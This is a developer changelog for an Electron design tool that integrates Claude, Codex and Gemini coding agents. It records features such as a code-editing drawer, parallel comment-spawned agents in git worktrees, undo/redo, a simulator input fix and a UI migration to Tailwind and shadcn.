## 2026-07-03 — Dev-mode Chrome DevTools (CDP endpoint)

`bun run dev` now passes `--remote-debugging-port` (9222; `DSGN_DEBUG_PORT`
overrides), gated on `ELECTRON_RENDERER_URL` so a built/packaged app never opens
it. Real Chrome attaches full DevTools (Elements/Console/Network/Sources/
Performance) to both the chat window and the preview `WebContentsView` via
`chrome://inspect`. Verified live: dev app answers `:9222/json` (~5s after
launch); built app booted and the port stayed closed across 10s of retries;
full `bun run verify` green. Nuance: the preview target only appears after a
project is open (`ensurePreviewView` is lazy — first `preview:set-bounds`).
Gotcha + Chrome 111+ `remote-allow-origins` note added to CONTEXT.md.

## 2026-07-02 — v9 Phase 2: editable code drawer (user-requested)

Finished the in-tool code view — Phase 1 let you *look* at the inspected element's
source; Phase 2 lets you *edit* it without leaving dsgn. A CodeMirror 6 drawer
docks under the preview; saving routes through the same `commitEdit` seam as every
other direct edit, so undo/redo, on-disk conflict detection, and HMR all come free.

Also **cleaned up `docs/TASKS.md`** first (user request): shipped milestones (v2–v8)
moved to a new `docs/TASKS-archive.md`; the open v7 (multi-provider), v6 leftovers,
deferred Svelte, and blocked polish items were **dropped** and recorded in the
archive's "Dropped" section so they aren't silently forgotten. TASKS.md is now just v9.

- **Geometry** (`PreviewPane.tsx` + `usePanelInset`): a DOM panel can't float over
  the native `WebContentsView`, so the drawer reserves space instead. `usePanelInset`
  gained a `bottom` value alongside the existing right-edge `inset` (PropPanel); the
  pane now shrinks the native view's HEIGHT by `bottom` (`availH`), and the drawer —
  absolutely positioned at the bottom of `previewcard__body` — fills the freed strip.
  Both desktop and mobile (bezel) paths honor it.
- **Save seam** (`props.ts`): `source:write(root, source, baseline, content)` →
  refuses if the on-disk content drifted from the `baseline` the drawer loaded
  (conflict, same contract as undo/redo), else `commitEdit` (write + history entry).
  `SourceWriteResult` in `shared/api.ts`; preload + IPC wired.
- **UI**: `CodeDrawer.tsx` — CM6 built imperatively (`basicSetup` + lang-javascript/
  html/css, light default highlight to match the app), the stamp's line span marked
  via a mapped `StateField` decoration (`.cm-stamp-line`), scrolled to the element,
  `⌘S`/Save (dirty-gated) → `source:write`, conflict banner with Reload, close
  releases the inset. Opened from a new "Edit" ⤢ button in the `CodePeek` header;
  `useCodeDrawer` store holds the open source; closes on project switch (stale-root
  guard).
- **Dep**: added `codemirror` + `@codemirror/lang-{javascript,html,css}` (renderer is
  ESM). Trialed `@codemirror/theme-one-dark` but removed it — basicSetup's light
  default highlight fits the light app better.
- **Test**: `test/code-drawer.mjs` — engine (conflict guard, whole-file save writes +
  records undo, second stale save re-conflicts, `edits.undo` reverts) + UI (peek
  "Edit" → CM mounts, stamp highlighted, bottom inset reserved, close releases it);
  mutates the fixture then restores it. In `test`/`verify` as `test:codedrawer`;
  screenshot `13-code-drawer.png`. Full `verify` green (one unrelated flake: a stale
  node process holding port 7777 failed `viewport-per-project` until killed).
- **Known limit**: with the floating PropPanel (right strip) also open, it overlaps
  the drawer's top-right in a narrow window — the two insets are mutually unaware.

## 2026-07-03 — Inspector code peek + "open in editor" (user-requested)

The user kept alt-tabbing to an editor just to *look at* the code of the element
they were inspecting. Phase 1 of the in-tool code view: a read-only, syntax-
highlighted peek of the stamped source file right in the Inspector, plus a
one-click jump to the user's real editor. (Phase 2 — an editable CodeMirror
drawer under the preview with saves routed through `commitEdit` — is on TASKS.)

- **Engine** (`props.ts`): `source:read` IPC → `SourceView` (`shared/api.ts`):
  the whole file (context stays visible) + the stamp line + the element's full
  open→close **line span**, resolved by the same `findElementAtLine` +
  enclosing-`JSXElement` walk `applyTextEdit` uses. Svelte/unparsable files fall
  back to the stamp line alone. `resolveSource` keeps root-escape stamps out.
- **Open in editor** (`source:open-in-editor`): tries `code -g`/`cursor -g`/
  `zed`/`subl` with a `file:line:col` jump target (a missing CLI ENOENTs fast →
  next), then falls back to `shell.openPath` (OS default app, no jump). Fails
  soft with a message — never throws at the renderer.
- **UI**: `CodePeek.tsx` — a "Code" toggle in the Inspector's action row reveals
  the file: highlight.js (new direct dep; already in the tree via
  rehype-highlight, and it reuses the existing `.hljs-*` theme in styles.css),
  a line-number gutter, the element's span marked with a bar, auto-scrolled so
  the stamp sits a third down the viewport. Header shows `path:line` + an
  "Editor" jump button. Fixed 18px line height keeps the gutter/mark/scroll
  math honest; the whole-file render is one `<code>` block (no per-line hljs
  splitting, which breaks on multi-line tokens) with the span drawn as an
  absolutely-positioned bar behind the text.
- **Test**: `test/code-peek.mjs` — engine (file + spans incl. a new multi-line
  fixture element, root-escape refused, openInEditor soft-fail) + UI (toggle →
  highlighted peek, gutter, `data-stamp-line`, auto-scroll) + screenshot
  `12-code-peek.png`. In `test`/`verify` chains as `test:codepeek`.
- **Caveat**: developed in a sandboxed environment where the Electron binary
  can't download (GitHub releases blocked) — `typecheck`, `build`, and all pure
  bun tests are green here; run `bun run verify` locally to exercise the
  Electron suite including the new test.
## 2026-07-02 — provider-seam: don't depend on real CLIs being absent

`test/provider-seam.mjs` asserted the codex/gemini backends fail soft "when the
CLI is absent" — but on dev machines the CLIs can resolve: a user-installed
`gemini` (~/.bun/bin), and the `codex` shim that `bun run` puts on PATH via the
repo's `node_modules/.bin` (from `@openai/codex-sdk`). Then the probe/spawn
succeeds, a real (unauthenticated) turn spins on 401 retries, and the test —
and `bun run verify` — fails. (Standalone `node test/provider-seam.mjs` passed
because plain `node` doesn't prepend `node_modules/.bin`, which made it look flaky.)

- `backends/codex.ts` / `backends/gemini.ts`: CLI binary is overridable via
  `DSGN_CODEX_BIN` / `DSGN_GEMINI_BIN` (default unchanged: `codex` / `gemini`).
- `test/provider-seam.mjs`: launches Electron with both vars pointed at
  nonexistent paths, so the fail-soft assertions hold regardless of what's
  installed; codex `done` assertion now dumps the event stream on failure.

## 2026-07-02 — Viewport (Desktop/Mobile) is now per-project

User report: pick Mobile on one project, open/switch to another → it's Mobile
too. `useViewport` was a single global store, so the toggle leaked across
projects.

- `ProjectEntry.viewport` added to the workspace snapshot (like url/branch):
  `setViewport` writes through to the ACTIVE entry; `applyProject` (rail
  switch) restores the target's own viewport right after `activate` (ordering
  matters — the write-back must land on the incoming entry, not the outgoing);
  `attempt()` sets it after `openOrActivate`, so a fresh open starts at
  desktop and a re-open keeps that project's choice.
- New test `viewport-per-project.mjs` (in `verify`): A→mobile, open B (must be
  desktop), switch A (mobile restored), switch B (desktop kept).

## 2026-07-02 — Fix: doubled/misaligned iPhone bezel in mobile preview

User report: open a project in mobile viewport, open a NEXT project → two
iPhone frames, misaligned. The switch was a red herring — the trigger is the
second project's own CSS. The bezel is an `<img>` injected INTO the previewed
page (so its opaque edge can mask the app's screen corners), which means the
page's stylesheets apply to it: a standard reset like Tailwind preflight's
`img { max-width: 100% }` clamped the upscaled frame (383px) back to the
viewport width (348px), pulling the whole bezel into view as a second squeezed
phone over the app, offset from the renderer's DOM bezel behind it. Projects
without such a reset (like the first one opened) never showed it.

- Fix in `src/preview/preload.ts`: pin the injected frame's geometry against
  page CSS — `max/min-width/height`, `margin/padding/border/transform` locked
  inline with `!important` (an inline `width` alone loses to a stylesheet
  `max-width`), and `positionFrame()` now sets its metrics via
  `setProperty(..., 'important')`. Same hardening for the desktop bottom-corner
  masks (same injected-overlay-vs-page-CSS class of bug).
- New regression test `test/mobile-frame.mjs` (in `verify`): serves a fixture
  WITH the img reset, switches to mobile, and asserts the injected frame
  overflows the viewport on all sides (verified it fails on the pre-fix build).
- Diagnosis harness insight: renderer screenshots can't show this (the native
  view isn't in the DOM) — measure the injected img's rect inside the preview's
  webContents via `executeJavaScript` instead.

User report: an RN/Expo project previews fine, but taps/scrolls do nothing and
Select never picks anything. Two independent bugs, both invisible because every
error on the interaction path was swallowed:

- **`--udid` arg order (the primary bug):** `idbController` invoked
  `idb --udid <udid> ui tap x y` — idb's argparse rejects `--udid` before the
  root command, so **every tap/swipe/text had always failed** with a usage error
  (which only sim-e2e-style live runs could catch; the recording test bridge
  never exercises real idb). The flag must FOLLOW the subcommand:
  `ui tap --udid <udid> x y` (the hit-test path already did this — that's why
  `describe-point` worked while taps didn't). Extracted a pure exported
  `idbUiArgs()` builder and locked the order in `sim-control.mjs`.
- **Stale idb_companion wedges idb (env + resilience):** an `idb_companion`
  that outlives the simulator boot it attached to fails every command with
  "Mach port not connected" — and idb often still **exits 0**, printing the
  error to stderr, so exit-code checks miss it. Meanwhile `simctl` screenshots
  keep streaming → the preview looks alive but ignores input. New: stale-marker
  detection in `idbExec` (stderr scan, `IDB_STALE_RE`), auto-recovery
  (`recoverIdb`: pkill companions + wipe `/tmp/idb`, idb's hardcoded state dir)
  with one retry, and an `idbHealthy()` gate at `start()` (a stale companion
  reports `state: "Shutdown"` for a booted device) so interaction is only
  enabled when idb can actually drive the device — with a clear view-only log
  line when it can't.
- **Feedback instead of silence:** a failed `/control` command now flashes a
  hint on the bridge page (was: ignored response); a select-tap hit-test error
  logs to the simulator log (was: `.catch(() => {})`); and an **unstamped**
  element pick now still surfaces in the Inspector as `source: null` → the
  "project isn't set up" note + setup offer (was: tap did nothing), so a
  third-party Expo app without the RN Babel stamp gets a signposted path
  instead of a dead click. `SimPick.source` is `string | null` now
  (`shared/api.ts` updated to match).

**Verified end-to-end on a real Expo app** (`expo-animations-gallery`) via a live
boot: "idb detected" log → `/control` tap `{ok:true}` → select-mode tap routed as
pick → renderer received `{source:null, tag:"Button"}`. Suite: typecheck + all
sim/select/smoke tests green. Known-unrelated failure: `provider-seam.mjs` now
fails on this machine because a real `gemini` CLI is installed (the test assumes
it absent) — spun off as a separate task.

## 2026-07-01 — Chat: interface for agent questions (AskUserQuestion)

The agent could edit and ask for tool permission, but it had no way to ask the
*user* a clarifying question ("which layout?", "which sections?"). Wired the Claude
Agent SDK's built-in **AskUserQuestion** tool through to an interactive
multiple-choice card in the chat.

- **New event contract** (`shared/api.ts`): `QuestionSpec`/`QuestionOption`/
  `QuestionRequest` + `QuestionAnswers`; `AgentEvent` gains `question-request` and
  `question-resolved` (mirroring the permission pair); `DsgnApi.agent.respondQuestion`.
- **Backend interception** (`backends/claude.ts`): `canUseTool` catches
  `AskUserQuestion` **before** the permission machinery (so it never shows an
  approve/deny card), parses the loosely-typed input into `QuestionSpec[]`, emits
  `question-request`, and awaits the user's picks in a per-session `pendingQuestions`
  map (added to the `ProviderSession` seam, optional so non-Claude backends can skip
  it). The answer is fed back as the tool result by **denying with the answer as the
  message** — in headless SDK mode there's no built-in interactive prompt to run, so
  intercepting here keeps the whole exchange under dsgn's control; the message is
  phrased as an answer so the model continues with the choice in hand. Aborts/teardown
  release open questions (dismiss) so the SDK callback always unblocks.
- **IPC** (`agent.ts`): `agent:respond-question` settles the awaiting callback;
  `interrupt` + `closeSession` release any unanswered questions.
- **Renderer**: `useQuestions` store (pending queue, deduped by id, cleared on project
  switch — like `usePermissions`); `QuestionCards.tsx` renders each question with a
  header chip, the question, option buttons (label + description), an always-available
  free-text **Other…**, and **Skip**/**Send**. Single single-select questions submit on
  click; multi-select / multi-question requests collect picks then Send. App routes the
  question events (alongside the permission events); ChatPanel renders the cards above
  the composer.
- **Test**: `test/questions.mjs` (store-driven, no creds) — single-select auto-submit,
  multi-select + Send, Skip, and a `question-resolved` event clearing an open card. Added
  to `verify`. Full credential-independent suite green (`10-question-card.png`). The live
  canUseTool round-trip rides `agent-e2e` (gated on `claude login`).

## 2026-06-27 — v7: Codex backend made real (solo prep; live verify gated on `codex login`)

Took `backends/codex.ts` from a speculative stub (shape-guessing against docs, non-literal
import so it built without the package) to a real adapter against the installed SDK.

- **`@openai/codex-sdk@0.142.3`** added as a real dependency. ESM-only, so loaded via a
  dynamic `import()` and externalized by electron-vite (verified `import("@openai/codex-sdk")`
  survives in the CJS main bundle) — same pattern as the Claude SDK.
- **Rewrote against the REAL typed API** (read `dist/index.d.ts`): `new Codex().startThread(
  ThreadOptions)` → `Thread.runStreamed(input, { signal }) → { events: AsyncGenerator<ThreadEvent> }`.
  Mapping: `item.{started,updated,completed}` with `agent_message` → streaming deltas (per-item
  suffix diff); `file_change` → status + `cap.noteTool('Edit', {file_path})` (→ filesTouched);
  `command_execution`/`web_search`/`mcp_tool_call`/`reasoning` → status lines; `turn.failed`/
  `error` → error. `interrupt` wired via a per-turn AbortController; `shutdown` aborts + flags.
  `model`/`effort` honored via ThreadOptions; headless `approvalPolicy:'never'` + `sandboxMode:
  'workspace-write'`.
- **Fast preflight**: `codex --version` up front → a missing/unauthed CLI fails soft instantly
  with an "install + `codex login`" message, instead of a slow mid-turn spawn ENOENT.
- **Fixed a real multi-provider UX bug**: a non-Claude auth error used to render "⚠️ Not connected
  to Claude" and raise the Claude-specific onboarding banner (setup-token). Now the Claude note +
  banner are gated to `provider === 'claude'`; Codex/Gemini show their own descriptive error.
- **Tests**: `test/codex-e2e.mjs` (mirrors agent-e2e on the codex backend; SKIPs cleanly until
  the user runs `codex login`, then proves the live event mapping). `provider-seam.mjs` hardened
  to poll for `done` (the preflight subprocess made the old fixed-sleep flaky under load). Full
  verify green: 43 OK, codex-e2e + sim-e2e SKIP (gated).
- **Remaining (needs the user):** `codex login`, then codex-e2e verifies live; Codex tool-approval
  → permission-card mapping (deferred — no approval-request event in the SDK stream).

## 2026-06-27 — v6 stretch: collapsible tool-step disclosure (AI Elements Task pattern)

A long agent turn used to render its tool-use statuses as a flat list that pushed the
actual answer down the panel. Now each assistant message's steps collapse into a
`StepDisclosure` — the AI-Elements Task/Reasoning pattern, built on the **already-vendored
shadcn `Collapsible`** (no new Radix dep): collapsed shows the latest step + a count
(`› Edit · src/components/Hero.tsx · 2 steps`), expandable to the full list. It auto-opens
while the turn is live (watch progress), auto-collapses when it finishes, and respects a
manual toggle in between. Tests only read `statuses` from the store (not the status DOM),
so the restructure was safe; `chat-render.mjs` gains a collapse→expand assertion. Picked
this over the shadcn-Select picker conversion (which would need a new Radix dep + flaky
portal-based test interaction for modest polish). Full verify green.

## 2026-06-27 — v8 F1 Phase 3: per-repo cap + FIFO queue + interrupt (F1 complete)

The "N parallel agents never wedge or leak" hardening — completes F1 and v8.

- **Cap + queue** (`agent.ts`): `MAX_SPAWNS_PER_REPO = 3`. A spawn over the cap is pushed
  to a FIFO `spawnQueue` (returns `{queued:true}`); `pumpQueue(parentKey)` runs on each
  `finalizeSpawn` and starts the next queued spawn as a slot frees. The spawn id is
  assigned UP FRONT so the rail row is stable across the queued→running flip; a
  `spawn-started` event carries the branch when a queued spawn actually starts.
  `startSpawn` is the shared create-worktree-+-start path (immediate and dequeued),
  reclaiming the worktree + pumping the queue on any failure.
- **Interrupt** (`agent:spawn-interrupt`): cancels a running spawn (`session.interrupt()` →
  done → finalize commits whatever it did) or drops a still-queued one. Surfaced as a ×
  on each rail working/queued row.
- **Already landed in the F1 review fixes:** startup orphan-prune (open-project) and
  before-quit-leave-for-prune (no work lost), so Phase 3's leak/recovery items were done.
- Renderer: `useSpawns` gains `queued` status + a `start()` transition; ChatPanel handles
  `spawn-started`; App sets the initial status from `queued`; Rail shows a grey queued dot
  + the interrupt ×. `spawn-comment.mjs` covers the queued→running→removed lifecycle.
- **v8 is now complete:** R1, F3a, F3b, F2, F1 (all 4 phases) shipped. Deferred niceties:
  per-spawn Bash allowlist, a rich ConflictPanel, non-Claude spawn backends.

## 2026-06-27 — v8 F1 Phase 2: Apply / PR / Discard a finished comment spawn

Closes the loop — a spawn's work, previously stranded on its `dsgn/comment-<id>` branch,
now reaches the preview.

- `worktrees.ts`: `branchPatch(repoRoot, branch)` = `<branch>^..<branch>` (the spawn's
  single commit — exactly its edits, not the WIP base), plus `deleteBranch` / `branchExists`.
- `agent.ts`: `agent:spawn-apply` (patch the branch diff onto the LIVE tree via the same
  `applyToWorkingTree` — plain apply, `--3way` fallback, conflict reported), `agent:
  spawn-discard` (delete the branch), `agent:spawn-pr` (push + `gh pr create --head <branch>`
  with origin/gh preflight; persists prUrl onto the history record).
- `SessionReview` gains an action bar for `kind:'comment'` records: **Apply** (preview HMRs
  the change), **Open PR**, **Discard** (deletes branch + drops the record). Conflicts/errors
  surface as a colored note. (Rich ConflictPanel deferred — a status note for now.)
- `spawn-comment.mjs` adds a deterministic Apply/Discard round-trip (hand-built branch, no
  model): apply lands the edit on the live tree, discard deletes the branch. Full verify green.

## 2026-06-27 — v8 F1 (phases 0+1): comment → parallel agent in its own git worktree

**Contention decided by a design judge-panel** (3 models architected against the real
seam, scored on correctness/effort/UX): **worktree-per-spawn** won (7.33) over advisory
conflict-detection (7.0) and a serialized write-lock (5.33). Each comment-spawned agent
runs in its OWN `git worktree` on a `dsgn/comment-<id>` branch — a private checkout
sharing the object store — so N comments edit the repo in true parallel with zero
cross-writes. The judges' correctness flag (merging a spawn branch back fails against the
main agent's uncommitted WIP) is fixed by patch-applying the spawn's diff onto the live
tree (`git apply`/`--3way`), not `git merge`.

- **Phase 0 — `src/main/worktrees.ts`** (pure git, the de-risking crux): createWorktree
  forks off the live tree's CURRENT state including WIP (via `git stash create`, no side
  effects); commitWorktree returns git's authoritative file list; diffWorktree
  (`--full-index --binary`); applyToWorkingTree (plain apply, `--3way` fallback, conflict
  detection — NOT `git merge`); removeWorktree + pruneOrphans (crash recovery), never
  throw. `test/worktrees.mjs` proves isolation, WIP-preserving fork, apply-onto-dirty-tree.
- **Phase 1 — the spawn slice.** `SpawnContext` added to the backend seam (claude.ts
  threads `emitKey`/`sessionId`/`onEvent`); a spawn files its events + history under the
  PARENT project key but stamps `sessionId`. `agent.ts` gets a separate `spawns` map
  (never touches `activeKey`), `agent:spawn-comment` (bypassPermissions — headless, no
  card UI; creates a worktree, starts a detached session), and `finalizeSpawn` (closeSession
  → persist under parent → commitWorktree → save git file-list → removeWorktree keeping the
  branch → emit `spawn-finished`). Renderer: `useSpawns` store, `App.onComment` dispatches
  a spawn (falls back to seeding chat for non-repos), `ChatPanel.onEvent` drops any
  `sessionId` event before the chat router (the byte-clean-main-stream guarantee) and on
  `spawn-finished` reloads history, `Rail` shows a pulsing working row that becomes a
  previous-agent on finish.
- **Tests:** `test/spawn-comment.mjs` — deterministic (non-repo fallback; a `sessionId`
  delta proven NOT to enter the active chat; row add→spawn-finished→remove) PLUS a LIVE
  spawn that had a real Claude agent edit a temp git repo in its own worktree and commit to
  a `dsgn/comment-<id>` branch with main untouched. Full `verify` green (live spawn +
  AGENT-E2E both ran).
- **Adversarial review (4-dimension workflow, each finding verified) → 10 confirmed,
  all fixed before merge:**
  - `git stash create` silently drops UNTRACKED files — a spawn would fork from a base
    missing brand-new files the interactive agent just created. Replaced with a
    throwaway-index `captureBase` (read-tree HEAD → add -A → write-tree → commit-tree)
    that snapshots tracked + untracked WIP.
  - `App.tsx`'s second `onEvent` listener lacked the `sessionId` guard → a spawn's init
    `commands` overwrote the active slash menu and its auth error raised the onboarding
    banner. Guarded (main broadcasts to both listeners).
  - A spawn whose `startSession` threw (SDK load / not logged in) leaked its worktree
    (created before the `spawns.set`) → now reclaimed in a catch.
  - `pruneOrphans` was written + tested but never CALLED → wired at open-project (skips
    ids of spawns live this session so it can't reap an active checkout).
  - `before-quit` did `removeWorktree` fire-and-forget → discarded uncommitted work and
    raced exit. Now just stops the subprocess; next launch's pruneOrphans commits the
    dirty leftover to its branch and reclaims it.
  - bypassPermissions skips the `canUseTool` sidecar deny, and `.dsgn/` isn't gitignored
    → a spawn could land sidecar writes on the live tree via Apply. `commitWorktree` now
    unstages `.dsgn` so it never reaches the branch/patch. (Bash allowlist still deferred.)
  - `git worktree add` races on shared admin state → `createWorktree` serialized behind
    an in-process chain.
- **Deferred to F1 phases 2–3:** Apply/PR/Discard on a finished row (+ ConflictPanel),
  per-repo cap + queue, before-quit finalize hardening, per-spawn Bash allowlist,
  non-Claude backends. The spawn's edits currently live on the branch (reviewable via the
  existing transcript path); reaching the live preview is Phase 2.

## 2026-06-27 — v8 F2: broaden direct editing (schema defaults + reset-to-default)

- **Scoped first** (Explore agent): the literal-recognition set in `props.ts` is already
  broad — expression-container literals (`count={3}`, `active={true}`), TS casts, no-sub
  template literals, unary minus all read as clean literals; genuine expressions (handlers,
  member/array/object) correctly route to chat. So F2 wasn't "recognize more literals" —
  the gaps were **no schema defaults** and **no removal/reset**.
- **Schema defaults**: `docgenPropToField` now parses react-docgen's `defaultValue` source
  string into a typed `PropField.default` (handles `'brand'` / `3` / `false`, drops
  computed/ill-typed). The panel shows `default: X` per field. (react-docgen does extract
  destructuring defaults like `{ tone = 'brand' }` for function components — confirmed live.)
- **Reset-to-default**: new `props.remove(root, source, name)` IPC → `removeProp` (React) /
  `removeSvelteProp` (Svelte) deletes the attribute from source, collapsing one run of
  adjacent whitespace so nothing dangles. Routes through `commitEdit`, so a reset is
  reversible with Cmd+Z (F3b). An already-absent prop is a no-op success.
- **UI**: PropPanel shows a `reset` link only for props actually present on the element and
  **not required** (removing a required prop would break the component) — verified in the
  10-prop-editor.png artifact (variant*/label* have no reset; count/rounded do).
- Tests: `prop-edit.mjs` gains a `Chip` destructuring-default fixture (default extraction +
  reset→remove→undo + absent-prop no-op); `prop-edit-svelte.mjs` gains a `.svelte`
  reset→remove→undo. Full `verify` green (live AGENT-E2E passed).

## 2026-06-27 — v8 F3b: undo/redo for ALL direct dsgn source edits

- New `src/main/edit-history.ts` — the reversible-edit engine. Every direct apply path
  now routes through a shared `commitEdit(root, file, before, after, key)` (in props.ts,
  imported by props-svelte.ts): it writes, then `recordEdit`s the before/after. Covers
  React + Svelte props, inline text, and token swaps (T1/T2/T3) — not just the new panel.
- **Coalescing**: rapid edits of the same target (`source:prop` / `:text` / `:token`)
  within 500ms collapse to one undo step (a slider drag isn't 30 Cmd+Zs), keeping the
  original `before` so one undo reverts the whole burst.
- **Conflict guard**: undo/redo read the file's CURRENT content and refuse to write if it
  diverged from what we last wrote (the user edited it in their own editor) — surfaced in
  the renderer as a status error, never a silent clobber.
- **Per-project-root stacks**: the v5-C rail keeps several projects open, so history is
  keyed by root — Cmd+Z in project B never reverts a file in project A. Cleared on
  `agent:close-project`.
- IPC `edit:undo/redo/can` (root-scoped) → preload `window.api.edits` → renderer global
  keydown (Cmd+Z / Cmd+Shift+Z / Cmd+Y), skipped while typing in a field; re-inspects the
  selected element after a revert so the panel reflects the new source.
- Tests: `test/edit-history.mjs` (unit — record/coalesce/undo/redo/conflict/root-scope) +
  an apply→undo→redo→conflict round-trip appended to `test/prop-edit.mjs`. Full `verify`
  green (live AGENT-E2E passed; SIM-E2E skipped, no Xcode).

## 2026-06-27 — three stacked features: v5-D history UI, inspector→shadcn, direct prop/token edit

Built as stacked PRs off main (#28 → #31 → #32); each its own full `verify` + a
multi-agent adversarial review with fixes applied. Designed via a parallel design
workflow; reviewed via per-PR review workflows.

- **PR #28 — v5-D previous-agents history**, re-homed onto the v7 seam. Capture moved
  into a shared `backends/record.ts` (reused by claude + codex; `ProviderSession` gained
  `record`+`finalize`); persist on teardown in `agent.ts`. Renderer: `useHistory`, the
  rail previous-sessions sub-list, and the `SessionReview` modal. Review caught two real
  HIGH bugs (rail sub-list clipped horizontally → stack vertically; the modal was occluded
  by the native preview → hide it while open).
- **PR #31 — inspector surfaces → shadcn**: Inspector/Notes/Tokens/PropPanel migrated,
  every test hook preserved, dead CSS removed. The whole chat panel is now Tailwind+shadcn.
- **PR #32 — direct (agent-free) prop+token editing**: broadened literals (TS casts +
  no-sub template literals) and a new `applyToken` IPC (T1 schema-enum swap + T3 inline-
  style swap), agent fallback otherwise. Review caught a real correctness bug — T3 matched
  on value-family only, so a color token could land in `fontWeight`; fixed by gating on the
  CSS property name (+ a re-inspect race guard).

**Learnings:**
- **Stacked PRs** are the clean way to ship interdependent work when you can't auto-merge:
  #2 and #3 both touch `Inspector.tsx`; branching #3 off #2 (off #1) means each PR's diff
  is just its own change and there are zero conflicts — merge bottom-up, GitHub retargets.
- **Re-homing across a refactor** (v5-D capture built against the pre-v7 monolith) is a
  *manual* re-apply, never a cherry-pick — the old `agent.ts` would clobber the seam. A
  shared helper (`record.ts`) kept each provider's change to ~4 lines.
- **Tailwind v4's CSS parser chokes on an apostrophe even inside a `/* */` comment**
  ("Unterminated string") — keep comments apostrophe-free.
- **Renderer-DOM modals are occluded by the native `WebContentsView` preview** — hide the
  preview (reuse the drag `setVisible` path) while any centered overlay is open. The
  PropPanel inset-strip pattern only works for edge-docked panels.
- **Direct edits from semi-trusted token files** are injection-safe via `JSON.stringify`
  into the JS string literal, but **family checks must gate on the CSS property name**, not
  just the value shape, or you write a valid-but-wrong value silently.

## 2026-06-26 — v7: ModelProvider seam + Codex backend scaffold

Started multi-provider backends. **User decision: subscription login, not BYO API
key** — so we wrap each vendor's subscription-auth coding-agent SDK/CLI (Codex SDK,
Gemini CLI, Grok Build CLI), not the Vercel AI SDK. Each brings its own tools, so
the spike's ~6–8 day tool-suite rebuild evaporates. See `docs/v7-multi-provider-design.md`.

**Shipped (commit 8f2bd71):** the seam under `src/main/backends/` —
- `types.ts` — `ModelProvider`/`ProviderSession`/`PendingPrompt`. `agent.ts` is now
  backend-agnostic (session map / activeKey / teardown / permission settle-loop /
  `agent:*` IPC, all in terms of `ProviderSession` + `AgentEvent`).
- `claude.ts` — the incumbent Claude Agent SDK session extracted **verbatim** behind
  the seam (`InputStream`, `canUseTool`, streaming loop). `tools.ts` holds the shared
  tool policy (moved out of `agent.ts` to avoid an import cycle).
- `codex.ts` — EXPERIMENTAL OpenAI Codex via `@openai/codex-sdk` (sign-in-with-ChatGPT).
- `index.ts` — `pickProvider(options.provider)`, default Claude.
- `AgentOptions.provider`; `test/provider-seam.mjs`.

**The big safety property:** the Claude path is **byte-identical** — full `verify`
incl. the real AGENT-E2E turn passes through the new indirection. Non-Claude is
reachable only when the renderer sets `provider`, so default runtime is unchanged.

**Learnings:**
- Extracting the load-bearing `agent.ts` was a clean "pure move" precisely because
  the IPC layer already optional-chained the live controls (`query.setModel?.` etc.)
  — those became `ProviderSession.setModel?` with zero handler changes.
- **Lazy non-literal dynamic import** (`const PKG: string = '@openai/codex-sdk';
  await import(PKG)`) lets an optional backend compile + ship WITHOUT its package
  installed (TS types it `any`, no module resolution) — it fails soft at runtime
  (error + done) so a missing SDK / not-logged-in routes to the login banner instead
  of crashing. Same trick the Claude SDK uses for ESM-in-CJS, applied to optionality.
- Codex/Gemini/Grok each **bring their own hardened toolset** — we don't define one;
  the provider just maps their event stream to dsgn's `delta`/`status`/`done`/`error`.
- Still gated on a real `codex login` to verify the live event mapping (can't be
  tested without the user's subscription session).

## 2026-06-26 — v6: chat panel → Tailwind v4 + shadcn/ui + AI Elements

Migrated the chat panel off plain CSS onto Tailwind + shadcn (branch
`dsgn/v6-chat-shadcn`). Decision rule applied per feature: shadcn primitive →
AI Elements → custom. Full `verify` green (all ~30 tests incl. AGENT-E2E).

**Shipped (3 commits):**
- **Scaffold** — Tailwind v4 via `@tailwindcss/vite`, `@` alias, hand-written
  `components.json`, shadcn neutral/new-york tokens in `styles.css` (renamed
  `--accent/--border/--radius` → `--*-shadcn`/`--shadcn-radius` to avoid colliding
  with our legacy vars), `@layer base` border default, `lib/utils.ts` (cn). shadcn
  primitives under `components/ui/*`; AI Elements `conversation` under
  `components/ai-elements/`. Additive — existing plain-CSS UI visually unchanged.
- **Chat core** — message list → AI Elements `<Conversation>` (stick-to-bottom,
  replaces the manual scroll effect); user messages → shadcn muted bubble;
  assistant kept on our `react-markdown`. Composer → shadcn `<InputGroup>` +
  `<InputGroupAddon block-end>` + native textarea (`data-slot=input-group-control`
  for the focus ring); send/stop → shadcn `<Button>` (lucide ArrowUp). Pickers stay
  native `<select>`; slash menu stays custom (textarea-driven).
- **Cards** — PermissionCards / SetupCard / TokenOfferCard → shadcn `<Button>` +
  Tailwind alert surfaces; legacy `.perm*/.setup*` CSS removed (classes kept as
  test hooks). Dense element-inspector surfaces backlogged.

**Learnings (the non-obvious bits):**
- **shadcn CLI alias resolution reads the ROOT `tsconfig.json`, not per-project
  tsconfigs.** With our project-references root (no `paths`), `shadcn add` couldn't
  resolve `@` and wrote to a literal `@/` dir + `src/components/`. Fix: add
  `baseUrl`+`paths @/*` to the root tsconfig; for the already-scattered run we
  relocated files under `src/renderer/src/` + hand-wrote `lib/utils.ts` (the CLI
  skipped it) + appended the CSS tokens manually.
- **The new "shadcn chat primitives" (message/bubble/marker/message-scroller) are
  NOT in the public registry** under those names (`new-york-v4/message.json` 404).
  The research over-trusted a docs-page scrape. Reality: use `input-group` (real) +
  AI Elements `conversation` (real, lightweight — only `use-stick-to-bottom`, no
  `ai`/streamdown). AI Elements `message` pulls `ai`+`streamdown`, so the message
  row is custom + our Markdown. **Always validate registry names by running the CLI.**
- **Tailwind v4 preflight is safe next to legacy CSS** because v4 emits into
  `@layer` and our legacy rules are unlayered (always win). The flip side: a
  migrated element's Tailwind utilities LOSE to any leftover unlayered legacy rule,
  so each migrated block needs its conflicting *properties* stripped (we kept the
  class as a bare hook). Did this for `.chat__messages`, `.composer__input`,
  `.perm*`, `.setup*`.
- **React 18 + shadcn new-york:** components are React-19-style (no `forwardRef`).
  Don't pass a ref into a shadcn leaf (Textarea/Input/Button) — it won't attach.
  The composer keeps a NATIVE textarea for its `inputRef` (seeding/cursor). Radix
  (`radix-ui@1.6`) works on React 18.
- **Test contract held with ZERO test edits** by preserving every selector
  (`.composer__input` is the readiness gate for ~20 tests) + keeping pickers native
  (the permission-mode test reads `<option>`s via `$$eval`).

## 2026-06-26 — v5-C2: LRU-cap warm agent sessions

- Closes the resource gap left after v5-C: the dev-server LRU cap (N=3) was in,
  but each open project still held a live agent SDK CLI subprocess unbounded. Now
  the same eviction bounds **both**.
- **`agent.ts`** — new `agent:is-open` IPC (`sessions.has(projectKey(root))`) so the
  renderer can tell a suspended session from a live one.
